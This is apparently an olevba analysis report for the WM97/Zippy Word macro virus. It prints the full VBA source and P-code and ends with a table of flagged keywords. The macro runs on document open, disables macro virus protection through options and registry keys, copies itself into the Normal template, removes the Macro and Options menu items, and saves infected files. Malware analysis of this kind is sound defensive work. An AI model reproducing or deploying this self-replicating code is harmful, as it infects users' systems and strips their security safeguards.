olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.da
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.da - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo zippy
Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48): x = 0: o = 0
rt = ActiveDocument.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
st = NormalTemplate.VBProject.VBComponents.Item(Abs(1)).codemodule.countoflines
If st > 0 And rt > 0 Then GoTo zippy
If st = 0 Then
    Set rl = NormalTemplate.VBProject.VBComponents
    Set hst = ActiveDocument.VBProject.VBComponents
    If Month(Now()) > 1 And Day(Now()) = 15 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "It's Zippy!"
    hst.Item(Abs(1)).Name = rl.Item(Abs(1)).Name
    hst.Item(Abs(1)).Export Application.StartupPath & System.Version
End If
If rt = 0 Then Set rl = ActiveDocument.VBProject.VBComponents
rl.Item(Abs(1)).codemodule.AddFromFile Application.StartupPath & System.Version
With rl.Item(Abs(1)).codemodule
    For j = Chr(49) To Chr(52)
    .deletelines Chr(49)
        Next j
End With
System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
If st = 0 Then CommandBars("tools").Controls("Macro").Delete
If st = 0 Then CommandBars("tools").Controls("Options...").Delete
If st = 0 Then rl.Item(Abs(1)).codemodule.replaceline 1, "Sub AutoClose()"
If st = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
zippy:
If st <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'WM97/Zippy by Virus :) Smile
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.da
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3390 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	OnError zippy 
' Line #2:
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St x 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St o 
' Line #3:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St rt 
' Line #4:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St st 
' Line #5:
' 	Ld st 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo zippy 
' 	EndIf 
' Line #6:
' 	Ld st 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #7:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set rl 
' Line #8:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set hst 
' Line #9:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Gt 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "It's Zippy!"
' 	LitStr 0x0000 ""
' 	LitStr 0x0021 "HKEY_CLASSES_ROOT\Word.Document.8"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #10:
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld rl 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #11:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld hst 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set rl 
' 	EndIf 
' Line #14:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld System 
' 	MemLd Version 
' 	Concat 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld rl 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #15:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld rl 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #16:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0034 
' 	ArgsLd Chr 0x0001 
' 	For 
' Line #17:
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #18:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	EndWith 
' Line #20:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #21:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #22:
' 	Ld st 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #23:
' 	Ld st 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "Options..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #24:
' 	Ld st 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	FnAbs 
' 	Ld rl 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #25:
' 	Ld st 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #26:
' 	Label zippy 
' Line #27:
' 	Ld st 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld rt 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #28:
' 	EndSub 
' 	QuoteRem 0x0008 0x001C "WM97/Zippy by Virus :) Smile"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

